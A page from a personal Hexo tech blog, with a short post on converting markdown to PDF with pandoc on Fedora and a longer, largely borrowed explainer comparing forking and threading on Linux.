  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/windows/">windows</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-use-pandoc" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2014/03/19/use-pandoc/" class="article-date">
  <time datetime="2014-03-18T16:00:00.000Z" itemprop="datePublished">2014-03-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/tools/">tools</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2014/03/19/use-pandoc/">use pandoc</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="1introduce"><a href="#1-introduce" class="headerlink" title="1.introduce"></a>1.introduce</h3><p>  Pandoc is a swiss-army knife for coverting files from one markup format into<br>another, it can convert documents in markdown to HTML or pdf. To see more, knock<br>this <a href="http://johnmacfarlane.net/pandoc/" target="_blank" rel="external">link</a></p>
<h3 id="2-use"><a href="#2-use" class="headerlink" title="2. use"></a>2. use</h3><p>install missing packages on fedora:</p>
<pre><code>su -c &apos;yum install texlive-titlesec&apos;
su -c &apos;yum install texlive-titling&apos;
su -c &apos;yum install texlive-lastpage&apos;
</code></pre><p>generate pdf file:</p>
<pre><code>pandoc test.md -o test.pdf
</code></pre><p>using latex to generate pdf file:</p>
<pre><code>pandoc --latex-engine=xelatex  test.md -o test.pdf
</code></pre><p>generate pdf file by specify template:</p>
<pre><code>pandoc --latex-engine=xelatex --template=/home/dennis/template.latex test.md -o test.pdf
</code></pre><h3 id="3reference"><a href="#3-reference" class="headerlink" title="3.reference"></a>3.reference</h3><ul>
<li><a href="https://github.com/jgm/pandoc" target="_blank" rel="external">pandoc source</a></li>
<li><a href="http://blog.sina.com.cn/s/blog_5ee56d450101dah2.html" target="_blank" rel="external">&#x5229;&#x7528;Pandoc&#x5C06;markdown&#x6587;&#x4EF6;&#x8F6C;&#x5316;&#x4E3A;pdf</a></li>
<li><a href="http://www.yangzhiping.com/tech/pandoc.html" target="_blank" rel="external">Markdown&#x5199;&#x4F5C;&#x8FDB;&#x9636;&#xFF1A;Pandoc&#x5165;&#x95E8;&#x6D45;&#x8C08;</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2014/03/19/use-pandoc/" data-id="cinefv70s008djiizk0g13vu3" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pandoc/">pandoc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/write/">write</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-forking-and-threading" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2013/11/21/forking-and-threading/" class="article-date">
  <time datetime="2013-11-20T16:00:00.000Z" itemprop="datePublished">2013-11-21</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/language/">language</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2013/11/21/forking-and-threading/">Forking and Threading</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>##Why?</p>
<p>Sometimes, wo need to write some application, which should do multi task, this<br>time fork thread or multithread will show in our brain. But which one should we<br>need exactly, I think we should known them more before make decision.</p>
<p>##what?</p>
<p>History:</p>
<p>Linkers: </p>
<ul>
<li><a href="http://blog.csdn.net/Solstice/article/details/5307710" target="_blank" rel="external">http://blog.csdn.net/Solstice/article/details/5307710</a></li>
<li><a href="http://stackoverflow.com/questions/16354460/forking-vs-threading" target="_blank" rel="external">http://stackoverflow.com/questions/16354460/forking-vs-threading</a></li>
<li><a href="http://stackoverflow.com/questions/2483041/what-is-the-difference-between-fork-and-thread" target="_blank" rel="external">http://stackoverflow.com/questions/2483041/what-is-the-difference-between-fork-and-thread</a></li>
<li><a href="http://guogoul.com/2008/03/23/process/" target="_blank" rel="external">http://guogoul.com/2008/03/23/process/</a></li>
<li><a href="http://blog.csdn.net/blade2001/article/details/6790890" target="_blank" rel="external">http://blog.csdn.net/blade2001/article/details/6790890</a></li>
</ul>
<p>##Forking vs threading</p>
<p><strong>From:</strong> <a href="http://www.geekride.com/fork-forking-vs-threading-thread-linux-kernel/" target="_blank" rel="external">http://www.geekride.com/fork-forking-vs-threading-thread-linux-kernel/</a></p>
<p>So, finally after long time, i am able to figure out the difference between forking and threading :)</p>
<p>When i have been surfing around, i see a lots of threads/questions regarding forking and threading, lots of queries which one should be used in the applications. So i wrote this post which could clarify the difference between these two based on which you could decide what you want to use in your application/scripts.</p>
<h3 id="what-is-forkforking"><a href="#What-is-Fork-Forking" class="headerlink" title="What is Fork/Forking:"></a>What is Fork/Forking:</h3><p>Fork is nothing but a new process that looks exactly like the old or the parent process but still it is a different process with different process ID and having  it&#x2019;s own memory. Parent process creates a separate address space for child. Both parent and child process possess the same code segment, but execute independently from each other.</p>
<p>The simplest example of forking is when you run a command on shell in unix/linux. Each time a user issues a command, the shell forks a child process and the task is done.</p>
<p>When a fork system call is issued, a copy of all the pages corresponding to the parent process is created, loaded into a separate memory location by the OS for the child process, but in certain cases, this is not needed. Like in &#x2018;exec&#x2019; system calls, there is not need to copy the parent process pages, as execv replaces the address space of the parent process itself.<br>Few things to note about forking are:</p>
<ul>
<li>The child process will be having it&#x2019;s own unique process ID.</li>
<li>The child process shall have it&#x2019;s own copy of parent&#x2019;s file descriptor.</li>
<li>File locks set by parent process shall not be inherited by child process.</li>
<li>Any semaphores that are open in the parent process shall also be open in the child process.</li>
<li>Child process shall have it&#x2019;s own copy of message queue descriptors of the parents.</li>
<li>Child will have it&#x2019;s own address space and memory.</li>
</ul>
<p>Fork is universally accepted than thread because of the following reasons:</p>
<ul>
<li>Development is much easier on fork based implementations.</li>
<li>Fork based code a more maintainable.</li>
<li>Forking is much safer and more secure because each forked process runs in its own virtual address space. If one process crashes or has a buffer overrun, it does not affect any other process at all.</li>
<li>Threads code is much harder to debug than fork.</li>
<li>Fork are more portable than threads.</li>
<li>Forking is faster than threading on single cpu as there are no locking over-heads or context switching.</li>
</ul>
<p>Some of the applications in which forking is used are: telnetd(freebsd), vsftpd, proftpd, Apache13, Apache2, thttpd, PostgreSQL.</p>
<p>Pitfalls in Fork:</p>
<ul>
<li>In fork, every new process should have it&#x2019;s own memory/address space, hence a longer startup and stopping time.</li>
<li>If you fork, you have two independent processes which need to talk to each other in some way. This inter-process communication is really costly.</li>
<li>When the parent exits before the forked child, you will get a ghost process. That is all much easier with a thread. You can end, suspend and resume threads from the parent easily. And if your parent exits suddenly the thread will be ended automatically.</li>
<li>In-sufficient storage space could lead the fork system to fail.</li>
</ul>
<h3 id="what-are-threadsthreading"><a href="#What-are-Threads-Threading" class="headerlink" title="What are Threads/Threading:"></a>What are Threads/Threading:</h3><p>Threads are Light Weight Processes (LWPs). Traditionally, a thread is just a CPU (and some other minimal state) state with the process containing the remains (data, stack, I/O, signals). Threads require less overhead than &#x201C;forking&#x201D; or spawning a new process because the system does not initialize a new system virtual memory space and environment for the process. While most effective on a multiprocessor system where the process flow can be scheduled to run on another processor thus gaining speed through parallel or distributed processing, gains are also found on uniprocessor systems which exploit latency in I/O and other system functions which may halt process execution.</p>
<p>Threads in the same process share:</p>
<ul>
<li>Process instructions</li>
<li>Most data</li>
<li>open files (descriptors)</li>
<li>signals and signal handlers</li>
<li>current working directory</li>
<li>User and group id</li>
</ul>
<p>Each thread has a unique:</p>
<ul>
<li>Thread ID</li>
<li>set of registers, stack pointer</li>
<li>stack for local variables, return addresses</li>
<li>signal mask</li>
<li>priority</li>
<li>Return value: errno</li>
</ul>
<p>Few things to note about threading are:</p>
<ul>
<li>Thread are most effective on multi-processor or multi-core systems.</li>
<li>For thread &#x2013; only one process/thread table and one scheduler is needed.</li>
<li>All threads within a process share the same address space.</li>
<li>A thread does not maintain a list of created threads, nor does it know the thread that created it.</li>
<li>Threads reduce overhead by sharing fundamental parts.</li>
<li>Threads are more effective in memory management because they uses the same memory block of the parent instead of creating new.</li>
</ul>
<p>Pitfalls in threads:</p>
<ul>
<li>Race conditions: The big loss with threads is that there is no natural protection from having multiple threads working on the same data at the same time without knowing that others are messing with it. This is called race condition. While the code may appear on the screen in the order you wish the code to execute, threads are scheduled by the operating system and are executed at random. It cannot be assumed that threads are executed in the order they are created. They may also execute at different speeds. When threads are executing (racing to complete) they may give unexpected results (race condition). Mutexes and joins must be utilized to achieve a predictable execution order and outcome.</li>
<li>Thread safe code: The threaded routines must call functions which are &#x201C;thread safe&#x201D;. This means that there are no static or global variables which other threads may clobber or read assuming single threaded operation. If static or global variables are used then mutexes must be applied or the functions must be re-written to avoid the use of these variables. In C, local variables are dynamically allocated on the stack. Therefore, any function that does not use static data or other shared resources is thread-safe. Thread-unsafe functions may be used by only one thread at a time in a program and the uniqueness of the thread must be ensured. Many non-reentrant functions return a pointer to static data. This can be avoided by returning dynamically allocated data or using caller-provided storage. An example of a non-thread safe function is strtok which is also not re-entrant. The &#x201C;thread safe&#x201D; version is the re-entrant version strtok_r.</li>
</ul>
<p>Advantages in threads:</p>
<ul>
<li>Threads share the same memory space hence sharing data between them is really faster means inter-process communication (IPC) is real fast.</li>
<li>If properly designed and implemented threads give you more speed because there aint any process level context switching in a multi threaded application.</li>
<li>Threads are really fast to start and terminate.</li>
</ul>
<p>Some of the applications in which threading is used are: MySQL, Firebird, Apache2, MySQL 323</p>
<h3 id="faqs"><a href="#FAQs" class="headerlink" title="FAQs:"></a>FAQs:</h3><ol>
<li><p>Which should i use in my application ?<br>Ans: That depends on a lot of factors. Forking is more heavy-weight than threading, and have a higher startup and shutdown cost. Interprocess communication (IPC) is also harder and slower than interthread communication. Actually threads really win the race when it comes to inter communication. Conversely, whereas if a thread crashes, it takes down all of the other threads in the process, and if a thread has a buffer overrun, it opens up a security hole in all of the threads.<br>which would share the same address space with the parent process and they only needed a reduced context switch, which would make the context switch more efficient.</p>
</li>
<li><p>Which one is better, threading or forking ?<br>Ans: That is something which totally depends on what you are looking for. Still to answer, In a contemporary Linux (2.6.x) there is not much difference in performance between a context switch of a process/forking compared to a thread (only the MMU stuff is additional for the thread). There is the issue with the shared address space, which means that a faulty pointer in a thread can corrupt memory of the parent process or another thread within the same address space.</p>
</li>
<li><p>What kinds of things should be threaded or multitasked?<br>Ans: If you are a programmer and would like to take advantage of multithreading, the natural question is what parts of the program should/ should not be threaded. Here are a few rules of thumb (if you say &#x201C;yes&#x201D; to these, have fun!):</p>
</li>
</ol>
<ul>
<li>Are there groups of lengthy operations that don&#x2019;t necessarily depend on other processing (like painting a window, printing a document, responding to a mouse-click, calculating a spreadsheet column, signal handling, etc.)?</li>
<li>Will there be few locks on data (the amount of shared data is identifiable and &#x201C;small&#x201D;)?</li>
<li>Are you prepared to worry about locking (mutually excluding data regions from other threads), deadlocks (a condition where two COEs have locked data that other is trying to get) and race conditions (a nasty, intractable problem where data is not locked properly and gets corrupted through threaded reads &amp; writes)?</li>
<li>Could the task be broken into various &#x201C;responsibilities&#x201D;? E.g. Could one thread handle the signals, another handle GUI stuff, etc.?</li>
</ul>
<h3 id="conclusions"><a href="#Conclusions" class="headerlink" title="Conclusions:"></a>Conclusions:</h3><ul>
<li>Whether you have to use threading or forking, totally depends on the requirement of your application.</li>
<li>Threads more powerful than events, but power is not something which is always needed.</li>
<li>Threads are much harder to program than forking, so only for experts.</li>
<li>Use threads mostly for performance-critical applications.</li>
</ul>
<h3 id="references"><a href="#References" class="headerlink" title="References:"></a>References:</h3><ul>
<li><a href="http://en.wikipedia.org/wiki/Fork_(operating_system)" target="_blank" rel="external">http://en.wikipedia.org/wiki/Fork_(operating_system)</a></li>
<li><a href="http://tldp.org/FAQ/Threads-FAQ/Comparison.html" target="_blank" rel="external">http://tldp.org/FAQ/Threads-FAQ/Comparison.html</a></li>
<li><a href="http://www.yolinux.com/TUTORIALS/LinuxTutorialPosixThreads.html" target="_blank" rel="external">http://www.yolinux.com/TUTORIALS/LinuxTutorialPosixThreads.html</a></li>
<li><a href="http://linas.org/linux/threads-faq.html" target="_blank" rel="external">http://linas.org/linux/threads-faq.html</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://matrix207.github.com/2013/11/21/forking-and-threading/" data-id="cinefv70r0089jiizggaps5eu" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/c/">c++</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/9/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/11/">__('next') &raquo;</a>
  </nav>
</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/article/">article</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/blog/">blog</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/database/">database</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/english/">english</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/kernel/">kernel</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/language/">language</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/math/">math</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/network/">network</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/others/">others</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/person/">person</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/program/">program</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/source/">source</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/storage/">storage</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/windows/">windows</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/FAQ/" style="font-size: 10px;">FAQ</a> <a href="/tags/IRC/" style="font-size: 10px;">IRC</a> <a href="/tags/Translation/" style="font-size: 13px;">Translation</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/api/" style="font-size: 10px;">api</a> <a href="/tags/awk/" style="font-size: 11px;">awk</a> <a href="/tags/batch/" style="font-size: 14px;">batch</a> <a href="/tags/blog/" style="font-size: 10px;">blog</a> <a href="/tags/book/" style="font-size: 10px;">book</a> <a href="/tags/c/" style="font-size: 15px;">c</a> <a href="/tags/c/" style="font-size: 19px;">c++</a> <a href="/tags/cache/" style="font-size: 10px;">cache</a> <a href="/tags/crash/" style="font-size: 10px;">crash</a> <a href="/tags/database/" style="font-size: 17px;">database</a> <a href="/tags/debug/" style="font-size: 12px;">debug</a> <a href="/tags/dot/" style="font-size: 10px;">dot</a> <a href="/tags/driver/" style="font-size: 10px;">driver</a> <a href="/tags/emacs/" style="font-size: 11px;">emacs</a> <a href="/tags/exploit/" style="font-size: 10px;">exploit</a> <a href="/tags/file-system/" style="font-size: 10px;">file system</a> <a href="/tags/filesystem/" style="font-size: 12px;">filesystem</a> <a href="/tags/flowchart/" style="font-size: 10px;">flowchart</a> <a href="/tags/git/" style="font-size: 12px;">git</a> <a href="/tags/google/" style="font-size: 11px;">google</a> <a href="/tags/graphviz/" style="font-size: 11px;">graphviz</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/hosts/" style="font-size: 10px;">hosts</a> <a href="/tags/iscsi/" style="font-size: 14px;">iscsi</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/javascript/" style="font-size: 10px;">javascript</a> <a href="/tags/job/" style="font-size: 10px;">job</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/kernel/" style="font-size: 14px;">kernel</a> <a href="/tags/linux/" style="font-size: 14px;">linux</a> <a href="/tags/lisp/" style="font-size: 10px;">lisp</a> <a href="/tags/lua/" style="font-size: 10px;">lua</a> <a href="/tags/makefile/" style="font-size: 10px;">makefile</a> <a href="/tags/malloc/" style="font-size: 10px;">malloc</a> <a href="/tags/math/" style="font-size: 11px;">math</a> <a href="/tags/maxima/" style="font-size: 10px;">maxima</a> <a href="/tags/memory/" style="font-size: 11px;">memory</a> <a href="/tags/memory-overflow/" style="font-size: 10px;">memory overflow</a> <a href="/tags/mtrace/" style="font-size: 10px;">mtrace</a> <a href="/tags/netdisk/" style="font-size: 10px;">netdisk</a> <a href="/tags/network/" style="font-size: 20px;">network</a> <a href="/tags/others/" style="font-size: 18px;">others</a> <a href="/tags/pandoc/" style="font-size: 10px;">pandoc</a> <a href="/tags/performance/" style="font-size: 16px;">performance</a> <a href="/tags/person/" style="font-size: 11px;">person</a> <a href="/tags/protobuf/" style="font-size: 11px;">protobuf</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/rsync/" style="font-size: 10px;">rsync</a> <a href="/tags/sed/" style="font-size: 11px;">sed</a> <a href="/tags/shell/" style="font-size: 15px;">shell</a> <a href="/tags/skype/" style="font-size: 11px;">skype</a> <a href="/tags/sms/" style="font-size: 10px;">sms</a> <a href="/tags/source/" style="font-size: 11px;">source</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/stack/" style="font-size: 10px;">stack</a> <a href="/tags/storage/" style="font-size: 15px;">storage</a> <a href="/tags/study/" style="font-size: 10px;">study</a> <a href="/tags/svn/" style="font-size: 11px;">svn</a> <a href="/tags/sync/" style="font-size: 10px;">sync</a> <a href="/tags/test/" style="font-size: 11px;">test</a> <a href="/tags/time/" style="font-size: 10px;">time</a> <a href="/tags/tools/" style="font-size: 15px;">tools</a> <a href="/tags/valgrind/" style="font-size: 10px;">valgrind</a> <a href="/tags/vi/" style="font-size: 10px;">vi</a> <a href="/tags/vim/" style="font-size: 14px;">vim</a> <a href="/tags/virtual/" style="font-size: 11px;">virtual</a> <a href="/tags/wget/" style="font-size: 10px;">wget</a> <a href="/tags/windows/" style="font-size: 11px;">windows</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/write/" style="font-size: 13px;">write</a> <a href="/tags/xml/" style="font-size: 10px;">xml</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">February 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">October 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">September 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">July 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">June 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">March 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">February 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/11/">November 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">September 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">August 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">July 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">June 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">May 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">April 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">March 2014</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">November 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">October 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">September 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">August 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">July 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">June 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">May 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">April 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">March 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">February 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">January 2013</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">December 2012</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">September 2012</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2016/04/24/speed-up-cplusplus-compilation/">speed up c++ compilation</a>
          </li>
        
          <li>
            <a href="/2016/04/18/hexo/">Hexo</a>
          </li>
        
          <li>
            <a href="/2016/04/13/malloc/">malloc</a>
          </li>
        
          <li>
            <a href="/2016/03/12/performance-optimization-of-cplusplus/">performance optimization of C++</a>
          </li>
        
          <li>
            <a href="/2016/03/09/stack-trace-when-program-crash/">stack trace when program crash</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2016 Matrix207<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>